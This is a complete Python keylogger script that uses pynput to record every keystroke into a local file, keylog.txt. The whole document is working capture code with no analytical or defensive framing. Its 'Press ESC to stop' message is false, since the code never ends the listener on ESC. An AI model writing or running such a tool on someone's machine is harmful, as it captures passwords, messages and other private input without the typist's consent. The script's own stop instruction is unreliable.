from pynput import keyboard
from datetime import datetime
import os

# Log file path
LOG_FILE = "keylog.txt"

# Ensure the file exists
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        f.write("Keylogger started at {}\n".format(datetime.now()))

# Function to write keys to file
def write_to_file(key):
    try:
        with open(LOG_FILE, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(f"{key.char}")
            elif key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f"[{key.name}]")
    except Exception as e:
        print(f"Error writing to log file: {e}")

# Callback for key press
def on_press(key):
    write_to_file(key)

# Start listening to the keyboard
def start_keylogger():
    print("Keylogger is running... Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Main function
if __name__ == "__main__":
    start_keylogger()
